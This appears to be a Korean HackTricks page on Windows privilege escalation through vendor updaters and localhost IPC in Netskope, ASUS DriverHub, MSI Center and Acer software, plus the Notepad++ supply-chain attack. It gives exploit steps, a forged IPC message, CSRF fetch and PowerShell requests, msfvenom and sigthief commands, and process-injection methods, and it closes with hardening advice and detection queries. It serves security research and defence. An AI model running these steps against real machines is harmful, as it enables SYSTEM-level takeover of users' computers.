# 엔터프라이즈 자동 업데이트와 권한 있는 IPC 악용 (예: Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 낮은 마찰의 IPC 인터페이스와 권한 있는 업데이트 흐름을 노출하는 엔터프라이즈 엔드포인트 에이전트 및 updater에서 발견되는 Windows 로컬 권한 상승 체인의 한 범주를 일반화합니다. 대표적인 예로 Netskope Client for Windows < R129 (CVE-2025-0309)가 있으며, 저권한 사용자가 공격자 제어 서버로 등록을 강제하고 SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있습니다.

유사 제품에 재사용 가능한 핵심 아이디어:
- 권한 있는 서비스의 localhost IPC를 악용하여 공격자 서버로 재등록 또는 재구성을 강제할 것.
- 벤더의 업데이트 엔드포인트를 구현하고, 악성 Trusted Root CA를 배포한 뒤 업데이트 프로그램을 악의적인 “서명된” 패키지로 가리키게 할 것.
- 약한 signer 검사(CN allow-lists), 선택적 다이제스트 플래그, 느슨한 MSI 속성 등을 회피할 것.
- IPC가 “암호화”되어 있다면, 레지스트리에 저장된 모두가 읽을 수 있는 머신 식별자에서 key/IV를 유도할 것.
- 서비스가 이미지 경로/프로세스 이름으로 호출자를 제한하면, 허용 목록에 오른 프로세스에 인젝션하거나 하나를 suspended 상태로 생성해 최소한의 스레드 컨텍스트 패치로 DLL을 부트스트랩할 것.

---
## 1) localhost IPC를 통해 공격자 서버로 등록 강제

많은 에이전트는 JSON을 사용해 localhost TCP로 SYSTEM 서비스와 통신하는 사용자 모드 UI 프로세스를 제공합니다.

Netskope에서 관찰됨:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

익스플로잇 흐름:
1) 백엔드 호스트를 제어하는 클레임(예: AddonUrl)을 가진 JWT 등록 토큰을 생성. alg=None을 사용하여 서명이 필요 없게 함.
2) JWT와 tenant 이름을 포함해 provisioning 명령을 호출하는 IPC 메시지를 전송:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 서비스가 enrollment/config를 위해 당신의 조작된 서버로 요청을 보내기 시작합니다. 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name-based, originate the request from an allow-listed vendor binary (see §4).

---
## 2) 업데이트 채널을 가로채 SYSTEM으로 코드 실행

클라이언트가 당신의 서버와 통신하면, 예상되는 엔드포인트를 구현하고 클라이언트를 공격자 MSI로 유도합니다. 일반적인 순서:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM 형식의 CA 인증서를 반환합니다. 서비스는 이를 Local Machine Trusted Root 저장소에 설치합니다.
3) /v2/checkupdate → 악성 MSI와 가짜 버전을 가리키는 메타데이터를 제공합니다.

야외에서 관찰되는 일반 검사 우회:
- Signer CN allow-list: 서비스가 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”인지 여부만 검사할 수 있습니다. 공격자의 rogue CA는 해당 CN을 가진 leaf를 발급해 MSI에 서명할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 정상적인 MSI 속성을 포함시킵니다. 설치 시 강제 검증이 없습니다.
- Optional digest enforcement: config 플래그(예: check_msi_digest=false)가 추가 암호화 검증을 비활성화합니다.

결과: SYSTEM 서비스가 C:\ProgramData\Netskope\stAgent\data\*.msi에서 당신의 MSI를 설치하고, NT AUTHORITY\SYSTEM 권한으로 임의 코드를 실행합니다.

---
## 3) Forging encrypted IPC requests (when present)

R127부터 Netskope는 IPC JSON을 Base64처럼 보이는 encryptData 필드로 래핑했습니다. 리버싱 결과 AES가 레지스트리 값에서 파생된 key/IV로 동작함이 드러났고, 해당 레지스트리 값들은 일반 사용자도 읽을 수 있습니다:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

공격자는 암호화 방식을 재현해 일반 사용자 계정에서 유효한 암호화된 명령을 보낼 수 있습니다. 일반적인 팁: 에이전트가 갑자기 IPC를 “암호화”하면, HKLM 아래의 device ID, product GUID, install ID 등을 암호화 재료로 찾아보세요.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

일부 서비스는 TCP 연결의 PID를 확인해 이미지 경로/이름을 Program Files 아래의 allow-listed 벤더 바이너리(예: stagentui.exe, bwansvc.exe, epdlp.exe)와 비교해 피어를 인증하려 합니다.

실용적인 두 가지 우회 방법:
- DLL injection을 allow-listed 프로세스(예: nsdiag.exe)에 수행하고 그 내부에서 proxy IPC를 중계합니다.
- allow-listed 바이너리를 CREATE_SUSPENDED로 생성한 뒤 CreateRemoteThread 없이 proxy DLL을 부트스트랩하여 드라이버가 강제하는 변조 방지 규칙을 만족시킵니다(§5 참조).

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

제품들은 종종 minifilter/OB callbacks 드라이버(예: Stadrv)를 포함해 보호된 프로세스 핸들에서 위험한 권한을 제거합니다:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME 제거
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE로 제한

이 제약을 준수하는 신뢰성 있는 유저모드 로더:
1) 벤더 바이너리를 CREATE_SUSPENDED로 CreateProcess 합니다.
2) 여전히 얻을 수 있는 핸들들: 프로세스에 대해 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 그리고 스레드에 대해 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT(또는 알려진 RIP에서 코드 패치를 할 경우 THREAD_RESUME만) 을 획득합니다.
3) ntdll!NtContinue(또는 일찍 매핑되는 다른 thunk)를 LoadLibraryW로 당신의 DLL 경로를 호출한 뒤 복귀하는 작은 스텁으로 덮어씁니다.
4) ResumeThread로 프로세스 내에서 스텁을 실행해 당신의 DLL을 로드합니다.

이미 보호된 프로세스에서 PROCESS_CREATE_THREAD이나 PROCESS_SUSPEND_RESUME을 사용하지 않았고(직접 생성했기 때문에), 드라이버의 정책은 만족됩니다.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin)는 rogue CA 자동 생성, 악성 MSI 서명, 그리고 필요한 엔드포인트(/v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate) 제공을 자동화합니다.
- UpSkope는 임의의 (선택적으로 AES-암호화된) IPC 메시지를 생성하고 suspended-process 주입을 포함해 allow-listed 바이너리로부터 발생하는 IPC를 만들 수 있는 커스텀 IPC 클라이언트입니다.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 브라우저 호출을 기대하는 유저모드 HTTP 서비스(ADU.exe)를 제공합니다. Origin 필터는 Origin 헤더와 `/asus/v1.0/*`로 노출되는 다운로드 URL에 대해 `string_contains(".asus.com")`을 단순히 수행합니다. 따라서 `https://driverhub.asus.com.attacker.tld`와 같은 공격자 제어 호스트는 체크를 통과하여 JavaScript로 상태 변경 요청을 보낼 수 있습니다. 추가 우회 패턴은 See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md).

실전 흐름:
1) `.asus.com`을 포함하는 도메인을 등록하고 악성 웹페이지를 호스팅합니다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 특권 엔드포인트(예: `Reboot`, `UpdateApp`)를 호출합니다.
3) 핸들러가 기대하는 JSON 바디를 전송합니다 – packed frontend JS에 아래 스키마가 나와 있습니다.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
아래에 표시된 PowerShell CLI도 Origin header가 신뢰된 값으로 spoofed되면 성공합니다:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
따라서 공격자 사이트를 방문하는 모든 브라우저 액세스는 SYSTEM 헬퍼를 실행하는 1-클릭(또는 `onload`를 통한 0-클릭) 로컬 CSRF가 됩니다.

---
## 2) 코드 서명 검증 취약 및 인증서 복제 (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`는 JSON 본문에 정의된 임의의 실행 파일을 다운로드해 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`에 캐시합니다. 다운로드 URL 검증은 동일한 서브스트링 로직을 재사용하여 `http://updates.asus.com.attacker.tld:8000/payload.exe` 같은 URL도 허용됩니다. 다운로드 후 ADU.exe는 단지 PE에 서명이 있는지와 Subject 문자열이 ASUS와 일치하는지만 확인하고 실행합니다 – `WinVerifyTrust`나 체인 검증은 하지 않습니다.

흐름을 무기화하려면:
1) 페이로드 생성 (예: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS의 서명자를 페이로드에 복제 (예: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe`를 `.asus.com` 유사 도메인에 호스팅하고 위의 브라우저 CSRF로 UpdateApp을 트리거.

Origin 및 URL 필터가 둘 다 서브스트링 기반이고 서명자 검사가 단순 문자열 비교만 하기 때문에 DriverHub는 권한 상승된 컨텍스트로 공격자 바이너리를 내려받아 실행합니다.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center의 SYSTEM 서비스는 각 프레임이 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`인 TCP 프로토콜을 노출합니다. 핵심 컴포넌트(Component ID `0f 27 00 00`)는 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`를 제공하며, 해당 핸들러는:
1) 전달된 실행 파일을 `C:\Windows\Temp\MSI Center SDK.exe`로 복사합니다.
2) `CS_CommonAPI.EX_CA::Verify`를 통해 서명을 검증합니다(인증서 Subject는 “MICRO-STAR INTERNATIONAL CO., LTD.”와 일치해야 하고 `WinVerifyTrust`가 성공해야 함).
3) 임시 파일을 SYSTEM으로 실행하는 스케줄된 작업을 생성하며, 실행 시 인수는 공격자가 제어합니다.

복사된 파일은 검증과 `ExecuteTask()` 사이에 잠기지 않습니다. 공격자는:
- Frame A를 합법적인 MSI 서명 바이너리를 가리키도록 보내 검증이 통과되고 작업이 큐에 들어가도록 보장합니다.
- 검증이 완료된 직후에 악성 페이로드를 가리키는 Frame B 메시지를 반복 전송해 `MSI Center SDK.exe`를 덮어써 경쟁 상태를 유발할 수 있습니다.

스케줄러가 실행되면 원래 파일을 검증했음에도 덮어써진 페이로드를 SYSTEM 권한으로 실행합니다. 신뢰성 높은 익스플로잇은 CMD_AutoUpdateSDK를 스팸하는 두 개의 goroutine/스레드를 사용해 TOCTOU 창을 확보합니다.

---
## 2) 커스텀 SYSTEM-레벨 IPC 및 임퍼소네이션 악용 (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe`에 의해 로드되는 모든 플러그인/DLL은 `HKLM\SOFTWARE\MSI\MSI_CentralServer` 아래에 저장된 Component ID를 부여받습니다. 프레임의 처음 4바이트가 해당 컴포넌트를 선택하므로 공격자는 임의의 모듈로 명령을 라우팅할 수 있습니다.
- 플러그인은 자체 작업 실행기를 정의할 수 있습니다. `Support\API_Support.dll`은 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`를 노출하고 `API_Support.EX_Task::ExecuteTask()`를 직접 호출하며 **서명 검증 없음** – 로컬 사용자는 `C:\Users\<user>\Desktop\payload.exe`를 가리키기만 해도 결정적으로 SYSTEM 실행을 얻을 수 있습니다.
- Wireshark로 루프백을 스니핑하거나 dnSpy로 .NET 바이너리를 계측하면 Component ↔ command 매핑이 빠르게 드러나며, 맞춤형 Go/Python 클라이언트로 프레임을 재생할 수 있습니다.

### Acer Control Centre 명명된 파이프 및 임퍼소네이션 레벨
- `ACCSvc.exe` (SYSTEM)는 `\\.\pipe\treadstone_service_LightMode`를 노출하며, 그 임의 ACL은 원격 클라이언트(예: `\\TARGET\pipe\treadstone_service_LightMode`)를 허용합니다. 파일 경로와 함께 명령 ID `7`을 전송하면 서비스의 프로세스 생성 루틴이 호출됩니다.
- 클라이언트 라이브러리는 magic terminator 바이트(113)를 인수와 함께 직렬화합니다. Frida/`TsDotNetLib`로 동적 계측하면(계측 팁은 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) 참조) 네이티브 핸들러가 이 값을 `SECURITY_IMPERSONATION_LEVEL`과 무결성 SID로 매핑한 후 `CreateProcessAsUser`를 호출함을 보여줍니다.
- 113 (`0x71`)을 114 (`0x72`)로 바꾸면 전체 SYSTEM 토큰을 유지하고 높은 무결성 SID(`S-1-16-12288`)를 설정하는 일반 분기로 빠집니다. 따라서 생성된 바이너리는 로컬과 교차 머신 모두에서 제한 없는 SYSTEM으로 실행됩니다.
- 이를 노출된 인스톨러 플래그(`Setup.exe -nocheck`)와 결합하면 벤더 하드웨어 없이도 실험실 VM에서 ACC를 설치해 파이프를 테스트할 수 있습니다.

이러한 IPC 버그는 로컬호스트 서비스가 상호 인증(ALPC SIDs, `ImpersonationLevel=Impersonation` 필터, 토큰 필터링)을 강제해야 하는 이유와 모든 모듈의 “임의 바이너리 실행” 헬퍼가 동일한 서명 검증을 공유해야 하는 이유를 강조합니다.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

구형 WinGUp 기반 Notepad++ 업데이터는 업데이트 진위를 완전히 검증하지 않았습니다. 공격자가 업데이트 서버의 호스팅 제공자를 침해하면 XML 매니페스트를 변조하고 선택된 클라이언트만 공격자 URL로 리디렉션할 수 있었습니다. 클라이언트가 신뢰된 인증서 체인과 유효한 PE 서명 둘 다를 강제하지 않고 아무 HTTPS 응답이나 수락했기 때문에 피해자는 트로이화된 NSIS `update.exe`를 내려받아 실행했습니다.

운영 흐름(로컬 익스플로잇 불필요):
1. 인프라 가로채기: CDN/호스팅을 침해하고 업데이트 검사에 공격자 메타데이터를 응답하여 악성 다운로드 URL을 가리키게 함.
2. 트로이화된 NSIS: 인스톨러가 페이로드를 가져와 실행하고 두 가지 실행 체인을 악용:
   - BYO 서명된 바이너리 + sideload: 서명된 Bitdefender `BluetoothService.exe`를 번들로 묶고 검색 경로에 악성 `log.dll`을 떨어뜨립니다. 서명된 바이너리가 실행되면 Windows가 `log.dll`을 sideload하고, 그것이 Chrysalis 백도어를 복호화해 리플렉티브 로드합니다(정적 탐지를 어렵게 하는 Warbird 보호 + API 해싱).
   - 스크립트형 쉘코드 인젝션: NSIS가 컴파일된 Lua 스크립트를 실행하여 Win32 API(예: `EnumWindowStationsW`)를 사용해 쉘코드를 주입하고 Cobalt Strike Beacon을 스테이징합니다.

모든 자동 업데이트에 대한 하드닝/탐지 시사점:
- 다운로드된 인스톨러에 대해 **인증서 + 서명 검증**을 강제(벤더 서명자 핀, CN/체인 불일치 거부)하고 업데이트 매니페스트 자체에도 서명(예: XMLDSig)합니다. 검증되지 않은 경우 매니페스트 제어 리디렉션을 차단합니다.
- BYO 서명 바이너리 sideloading을 포스트-다운로드 탐지 피벗으로 취급: 서명된 벤더 EXE가 정규 설치 경로 밖에서 DLL 이름을 로드할 때(예: Bitdefender가 Temp/Downloads에서 `log.dll`을 로드) 경고하고, 업데이트가 임시 폴더에 벤더가 아닌 서명으로 인스톨러를 내려놓거나 실행할 때 경고합니다.
- 이 체인에서 관찰되는 악성코드 특이 지표(일반 피벗으로 유용)를 모니터링: mutex `Global\Jdhfv_1.0.1`, `%TEMP%`에 대한 이상한 `gup.exe` 쓰기, Lua 기반 쉘코드 인젝션 단계 등.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>가 Notepad++가 아닌 설치 프로그램을 실행함</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

이러한 패턴은 unsigned manifests를 허용하거나 installer signers를 pin하지 못하는 모든 updater에 일반화된다 — network hijack + malicious installer + BYO-signed sideloading은 “trusted” 업데이트로 위장한 원격 코드 실행을 초래한다.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
